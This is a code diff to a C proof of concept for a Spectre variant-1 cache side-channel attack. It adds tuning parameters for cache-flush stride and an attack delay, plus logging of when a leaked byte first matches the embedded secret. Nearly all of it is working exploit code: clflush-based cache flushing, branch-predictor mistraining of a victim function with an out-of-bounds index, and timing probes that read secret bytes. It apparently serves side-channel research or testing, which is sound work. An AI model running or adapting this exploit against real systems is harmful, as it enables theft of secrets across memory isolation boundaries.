@@ -62,11 +62,12 @@ static void calibrate(uint64_t *hit, uint64_t *miss)
 }
 
 static int leak_byte(size_t malicious_x, uint64_t threshold, int rounds,
-                     int jitter_range)
+                     int jitter_range, int flush_stride, int attack_gap,
+                     int byte_index, int *first_success)
 {
     int scores[256] = {0};
     for (int r = 0; r < rounds; r++) {
-        for (int i = 0; i < 256; i++)
+        for (int i = 0; i < 256; i += flush_stride)
             __builtin_ia32_clflush((const void *)&probe[i * 512]);
         fence();
         // Keep the source line available; only the dependent probe line is secret.
@@ -88,6 +89,8 @@ static int leak_byte(size_t malicious_x, uint64_t threshold, int rounds,
             x = training_x ^ (x & (malicious_x ^ training_x));
             victim_function(x);
         }
+        for (volatile int z = 0; z < attack_gap; z++)
+            sink ^= (uint8_t)z;
         for (int j = 0; j < 256; j++) {
             int k = (j * 167 + 13) & 255;
             uint64_t dt = measure(&probe[k * 512], 0);
@@ -105,6 +108,11 @@ static int leak_byte(size_t malicious_x, uint64_t threshold, int rounds,
             second = i;
     printf("top=%d(%d),%d(%d)\n", best, scores[best], second,
            scores[second]);
+    if (best == (unsigned char)secret[byte_index] && !*first_success) {
+        *first_success = 1;
+        printf("[SPECTRE-POC] first-success byte=%d guest_tsc=%llu\n",
+               byte_index, (unsigned long long)rdtsc());
+    }
     return best;
 }
 
@@ -114,9 +122,12 @@ int main(int argc, char **argv)
     int rounds = argc > 2 ? atoi(argv[2]) : 10;
     int jitter_range = argc > 3 ? atoi(argv[3]) : 0;
     unsigned seed = argc > 4 ? (unsigned)strtoul(argv[4], NULL, 0) : 0;
+    int flush_stride = argc > 5 ? atoi(argv[5]) : 1;
+    int attack_gap = argc > 6 ? atoi(argv[6]) : 0;
     if (argc > 4 && jitter_range == 0)
         jitter_range = 32;
-    if (secret_len < 1 || secret_len > 8 || rounds < 1 || jitter_range < 0)
+    if (secret_len < 1 || secret_len > 8 || rounds < 1 || jitter_range < 0 ||
+        flush_stride < 1 || flush_stride > 256 || attack_gap < 0)
         return 2;
     if (argc > 4)
         srand(seed);
@@ -129,12 +140,16 @@ int main(int argc, char **argv)
     printf("[SPECTRE-POC] calib hit=%lu miss=%lu threshold=%lu\n",
            hit, miss, threshold);
     printf("[SPECTRE-POC] jitter range=%d seed=%u\n", jitter_range, seed);
+    printf("[SPECTRE-POC] flush stride=%d attack gap=%d\n",
+           flush_stride, attack_gap);
     int correct = 0;
+    int first_success = 0;
     for (int i = 0; i < secret_len; i++) {
         size_t malicious_x = (size_t)((uintptr_t)secret -
                                       (uintptr_t)array1) + i;
         int expected = (unsigned char)secret[i];
-        int got = leak_byte(malicious_x, threshold, rounds, jitter_range);
+        int got = leak_byte(malicious_x, threshold, rounds, jitter_range,
+                            flush_stride, attack_gap, i, &first_success);
         if (got == expected)
             correct++;
         printf("byte[%d] expected=%d got=%d %s\n", i, expected, got,
